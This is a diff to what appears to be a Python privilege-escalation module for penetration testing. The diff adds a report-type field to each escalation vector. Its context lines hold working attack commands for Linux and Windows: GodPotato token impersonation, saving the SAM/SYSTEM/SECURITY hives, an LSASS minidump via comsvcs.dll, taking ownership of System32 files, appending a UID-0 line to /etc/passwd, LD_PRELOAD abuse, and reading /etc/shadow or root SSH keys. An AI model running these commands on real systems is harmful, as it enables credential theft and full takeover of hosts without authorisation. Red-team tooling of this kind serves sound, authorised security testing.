@@ -40,6 +40,7 @@ class Vector:
     evidence: str = ""
     safe_proof: str = None
     cleanup: str = None      # cleanup command when the vector changes state, else None
+    report_type: str = ""    # the reportkb vector_type a proven finding records under
 
     @property
     def score(self):
@@ -130,7 +131,8 @@ def _gtfo_vector(mode, basename, ctx):
         detail=f"{basename} spawns a root context via its {verb} form (GTFOBins).",
         evidence=f"{basename} is {verb}-abusable on this host",
         safe_proof="the vector runs `id` as root; drop the shell escape for a full shell.",
-        cleanup=entry.get("cleanup"))
+        cleanup=entry.get("cleanup"),
+        report_type="gtfobins_sudo" if mode == "sudo" else "gtfobins_suid")
 
 
 # --------------------------------------------------------------- capabilities
@@ -149,7 +151,8 @@ def _cap_vector(basename, cap, ctx):
             command=command, shell="sh", host=ctx.host,
             detail=f"{basename} carries {cap}; it can setuid(0) with no sudo or SUID bit.",
             evidence=f"getcap: {basename} {cap}",
-            safe_proof="the vector runs `id` as root via the capability.")
+            safe_proof="the vector runs `id` as root via the capability.",
+            report_type="capability")
     if cap == "cap_dac_read_search":
         return Vector(
             key=f"cap:{basename}", title=f"{cap} on {basename} → read any file",
@@ -158,7 +161,8 @@ def _cap_vector(basename, cap, ctx):
             shell="sh", host=ctx.host,
             detail=f"{basename} can read any file — pull /etc/shadow and crack, or steal /root/.ssh keys.",
             evidence=f"getcap: {basename} {cap}",
-            safe_proof="reading /etc/shadow proves the primitive without changing anything.")
+            safe_proof="reading /etc/shadow proves the primitive without changing anything.",
+            report_type="capability")
     if cap == "cap_dac_override":
         return Vector(
             key=f"cap:{basename}", title=f"{cap} on {basename} → write any file → root",
@@ -168,7 +172,7 @@ def _cap_vector(basename, cap, ctx):
             detail=f"{basename} can write any file — append a UID-0 line to /etc/passwd, then `su fk`.",
             evidence=f"getcap: {basename} {cap}",
             safe_proof="verify the write with `id fk`; then remove the line.",
-            cleanup="sed -i '/^fk::0:0:/d' /etc/passwd")
+            cleanup="sed -i '/^fk::0:0:/d' /etc/passwd", report_type="capability")
     return None
 
 
@@ -178,21 +182,21 @@ def _cap_vector(basename, cap, ctx):
 #: is required (see SUPPLIED-BINARIES.md); the command references the staging dir.
 WIN_PRIVS = {
     "SeImpersonatePrivilege": dict(
-        key="seimpersonate", title="SeImpersonate → SYSTEM (Potato)",
+        report_type="seimpersonate", key="seimpersonate", title="SeImpersonate → SYSTEM (Potato)",
         exploitability="high", safety="config-change", detection="moderate",
         needs="a Potato (GodPotato/PrintSpoofer) staged in {stage}",
         command='{stage}\\GodPotato.exe -cmd "cmd /c whoami"',
         cleanup="del {stage}\\GodPotato.exe",
         detail="token impersonation to SYSTEM — the most common service-account win."),
     "SeAssignPrimaryTokenPrivilege": dict(
-        key="seimpersonate", title="SeAssignPrimaryToken → SYSTEM (Potato)",
+        report_type="seimpersonate", key="seimpersonate", title="SeAssignPrimaryToken → SYSTEM (Potato)",
         exploitability="high", safety="config-change", detection="moderate",
         needs="a Potato staged in {stage}",
         command='{stage}\\GodPotato.exe -cmd "cmd /c whoami"',
         cleanup="del {stage}\\GodPotato.exe",
         detail="same Potato route as SeImpersonate."),
     "SeBackupPrivilege": dict(
-        key="sebackup", title="SeBackup → dump the SAM/SYSTEM hives",
+        report_type="sebackup", key="sebackup", title="SeBackup → dump the SAM/SYSTEM hives",
         exploitability="high", safety="config-change", detection="moderate",
         command='reg save HKLM\\SAM {stage}\\sam & reg save HKLM\\SYSTEM {stage}\\sys & '
                 'reg save HKLM\\SECURITY {stage}\\sec',
@@ -200,7 +204,7 @@ WIN_PRIVS = {
         detail="read the hives, then secretsdump offline for local hashes.",
         safe_proof="the reg-save succeeding proves the read primitive; delete the hives after."),
     "SeDebugPrivilege": dict(
-        key="sedebug", title="SeDebug → dump LSASS",
+        report_type="lsass", key="sedebug", title="SeDebug → dump LSASS",
         exploitability="high", safety="config-change", detection="loud",
         command='powershell -c "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump '
                 '(Get-Process lsass).Id {stage}\\l.dmp full"',
@@ -208,18 +212,18 @@ WIN_PRIVS = {
         detail="minidump LSASS, then pypykatz/mimikatz offline for logged-on creds.",
         safe_proof="a successful dump proves it; the .dmp is loot — pull and delete it."),
     "SeLoadDriverPrivilege": dict(
-        key="seloaddriver", title="SeLoadDriver → BYOVD kernel r/w → SYSTEM",
+        report_type="seloaddriver", key="seloaddriver", title="SeLoadDriver → BYOVD kernel r/w → SYSTEM",
         exploitability="high", safety="crash-risk", detection="loud",
         needs="a known-vulnerable signed driver staged in {stage}",
         command='echo BYOVD chain is driver-specific — stage the driver + its loader',
         detail="load a vulnerable signed driver for kernel r/w; loud and can BSOD."),
     "SeTakeOwnershipPrivilege": dict(
-        key="setakeownership", title="SeTakeOwnership → own a SYSTEM file → SYSTEM",
+        report_type="setakeownership", key="setakeownership", title="SeTakeOwnership → own a SYSTEM file → SYSTEM",
         exploitability="medium", safety="config-change", detection="moderate",
         command='takeown /f C:\\Windows\\System32\\<target> && icacls C:\\Windows\\System32\\<target> /grant %USERNAME%:F',
         detail="take ownership of a SYSTEM-owned service exe/DLL, rewrite its ACL, replace it."),
     "SeManageVolumePrivilege": dict(
-        key="semanagevolume", title="SeManageVolume → arbitrary write → SYSTEM",
+        report_type="semanagevolume", key="semanagevolume", title="SeManageVolume → arbitrary write → SYSTEM",
         exploitability="medium", safety="config-change", detection="moderate",
         command='echo SeManageVolume2System: obtain full C:\\ write, then plant a DLL a SYSTEM service loads',
         detail="turns into an arbitrary-file-write primitive; plant a DLL on a service's search path."),
@@ -228,7 +232,7 @@ WIN_PRIVS = {
 #: group membership that is itself a route, independent of held privileges.
 WIN_GROUPS = {
     "Backup Operators": dict(
-        key="sebackup", title="Backup Operators → dump the SAM/SYSTEM hives",
+        report_type="sebackup", key="sebackup", title="Backup Operators → dump the SAM/SYSTEM hives",
         exploitability="high", safety="config-change", detection="moderate",
         command='reg save HKLM\\SAM {stage}\\sam & reg save HKLM\\SYSTEM {stage}\\sys',
         cleanup="del {stage}\\sam {stage}\\sys",
@@ -263,7 +267,8 @@ def _d_sudo_all(facts, ctx):
             command="sudo -n id", shell="sh", host=ctx.host,
             detail="sudo -l shows (ALL) — become root directly with `sudo -i`.",
             evidence="sudo -l: (ALL : ALL) ALL",
-            safe_proof="`sudo -n id` returns uid=0 without a password prompt.")
+            safe_proof="`sudo -n id` returns uid=0 without a password prompt.",
+            report_type="sudo_misconfig")
 
 
 def _d_sudo_gtfo(facts, ctx):
@@ -298,7 +303,8 @@ def _d_docker_group(facts, ctx):
             shell="sh", host=ctx.host,
             detail="the docker group is root-equivalent — mount / into a container.",
             evidence="member of the docker group",
-            safe_proof="the container runs `id` as root over the mounted host fs.")
+            safe_proof="the container runs `id` as root over the mounted host fs.",
+            report_type="docker_group")
 
 
 def _d_sudo_env(facts, ctx):
@@ -312,7 +318,7 @@ def _d_sudo_env(facts, ctx):
             detail=f"sudo keeps {which}; preload a .so that runs as root before an allowed command.",
             evidence=f"sudo -l: env_keep+={which}",
             safe_proof="prove with a .so that only runs `id`; remove /tmp/p.so after.",
-            cleanup="rm -f /tmp/p.so")
+            cleanup="rm -f /tmp/p.so", report_type="ld_preload")
 
 
 def _d_win_privs(facts, ctx):
